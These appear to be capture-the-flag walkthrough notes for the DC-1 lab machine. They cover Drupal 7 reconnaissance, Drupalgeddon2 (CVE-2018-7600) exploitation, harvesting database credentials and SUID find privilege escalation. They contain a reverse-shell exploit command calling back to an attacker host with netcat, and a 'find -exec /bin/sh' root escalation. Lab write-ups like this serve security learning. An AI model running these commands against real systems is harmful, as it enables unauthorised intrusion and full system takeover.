# DC-1: Machine Notes

## Recon

### Nmap
- Port 22/tcp: SSH (OpenSSH 6.0p1)
- Port 80/tcp: HTTP (Apache 2.2.22, Drupal 7)
- Port 111/tcp: RPCBind

### Web Enumeration
- Application: **Drupal 7**.
- `robots.txt` reveals various Drupal paths.

## Initial Access

### Drupalgeddon2 Exploitation
- The site is vulnerable to **Drupalgeddon2** (CVE-2018-7600).
- Exploit: `python2 drupalgeddon2.py -h http://[IP] -c 'nc [KALI_IP] [PORT] -c sh'`
- Gained `www-data` shell.

### Post-Exploitation
- Found `flag1.txt` in `/var/www/`.
- Found database credentials in `/var/www/sites/default/settings.php`:
```php
'database' => 'drupaldb',
'username' => 'dbuser',
'password' => 'R0ck3t',
```
- Accessed MySQL: `mysql -u dbuser -pR0ck3t -h localhost drupaldb`.
- Extracted user hashes from `users` table.

## Privilege Escalation

### SUID Enumeration
- Checked for SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null | grep -v proc
```
- Found: `/usr/bin/find` is SUID.

### SUID find Abuse
- Use `find`'s `-exec` flag to execute a shell as root:
```bash
find . -exec /bin/sh \; -quit
```
- Result: **Root shell**.
